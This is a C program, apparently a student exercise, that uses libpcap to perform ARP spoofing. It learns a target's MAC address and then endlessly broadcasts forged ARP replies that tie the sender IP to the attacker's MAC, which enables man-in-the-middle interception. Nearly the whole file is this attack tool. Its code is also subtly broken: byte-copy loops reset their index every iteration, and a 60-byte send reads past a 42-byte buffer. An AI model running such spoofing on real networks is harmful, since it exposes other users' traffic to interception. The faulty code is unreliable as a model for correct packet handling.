#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>
#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
/*
- Ethernet Des : FFFFFF:FFFFFF
- Ethernet Src : My Mac
- Sender Mac
- Sender IP
- Target Mac : 00:00:00:00:00:00
- Target IP
*/
void Get_Ip(u_int8_t *ip_addr, u_int8_t *interface)
{
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    memcpy(ip_addr, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, 4);
    close(fd);
}
void Get_Mac(u_int8_t *mac_addr, u_int8_t *interface)
{
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, sizeof(ifr.ifr_name));
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
}
int main(int argc, char *argv[])
{
    if (argc != 4) {
        printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
        printf("sample: sned_arp wlan0 192.168.10.2 192.168.10.1\n");
        return -1;
    }
    pcap_t *handle;
    struct pcap_pkthdr *header;
    u_int8_t buf[PCAP_ERRBUF_SIZE];
    u_int8_t *interface = argv[1];
    u_int8_t attack_ip[4];
    u_int8_t attack_mac[6];
    u_int8_t sip[4];
    u_int8_t tip[4];
    u_int8_t tmac[6];
    u_int8_t packet[42];
    const u_int8_t *packet_get;

    handle = pcap_open_live(interface, BUFSIZ, 1, 1000, buf);
    inet_pton(AF_INET, argv[2], sip);
    inet_pton(AF_INET, argv[3], tip);

    Get_Ip(attack_ip, interface);
    Get_Mac(attack_mac, interface);

    for(int i=0; i<6; i++){
        packet[i] = 0xff;
    }
    for(int i=6; i<12; i++){
        int j=0;
        packet[i] = attack_mac[j];
        j++;
    }
    packet[12] = 0x08;
    packet[13] = 0x06;
    packet[14] = 0x00;
    packet[15] = 0x01;
    packet[16] = 0x08;
    packet[17] = 0x00;
    packet[18] = 0x06;
    packet[19] = 0x04;
    packet[20] = 0x00;
    packet[21] = 0x01;
    for(int i=22; i<28; i++){
        int j=0;
        packet[i] = attack_mac[j];
        j++;
    }
    for(int i=28; i<32; i++){
        int j=0;
        packet[i] = attack_ip[j];
        j++;
    }
    for(int i=32; i<38; i++){
        packet[i]=0x00;
    }
    for(int i=38; i<42; i++){
        int j=0;
        packet[i] = tip[j];
        j++;
    }
    pcap_sendpacket(handle, packet, 42);
    while(1)
    {
        pcap_next_ex(handle, &header, &packet_get);
        if( (packet_get[12] == 0x08) && (packet_get[13] == 0x06) && (packet_get[20] == 0x00) && (packet_get[21] == 0x02) && (packet_get[28] == tip[0]) &&
                (packet_get[29] == tip[1]) && (packet_get[30] == tip[2]) && (packet_get[31] == tip[3]) )
            break;
    }
    for(int i=0; i<6; i++){
        int j=22;
        tmac[i] = packet_get[j];
        j++;
    }
    for(int i=0; i<6; i++){
        packet[i] = tmac[i];
    }
    for(int i=6; i<12; i++){
        int j=0;
        packet[i] = attack_mac[j];
        j++;
    }
    packet[12] = 0x08;
    packet[13] = 0x06;
    packet[14] = 0x00;
    packet[15] = 0x01;
    packet[16] = 0x08;
    packet[17] = 0x00;
    packet[18] = 0x06;
    packet[19] = 0x04;
    packet[20] = 0x00;
    packet[21] = 0x02;
    for(int i=22; i<28; i++){
        int j=0;
        packet[i] = attack_mac[j];
        j++;
    }
    for(int i=28; i<32; i++){
        int j=0;
        packet[i] = sip[j];
        j++;
    }
    for(int i=32; i<38; i++){
        int j=0;
        packet[i] = tmac[j];
        j++;
    }
    for(int i=38; i<42; i++){
        int j=0;
        packet[i] = tip[j];
        j++;
    }
    while(1)
    {
        pcap_sendpacket(handle, packet, 60);
        printf("ARP SPOOFING :D\n");
    }
}
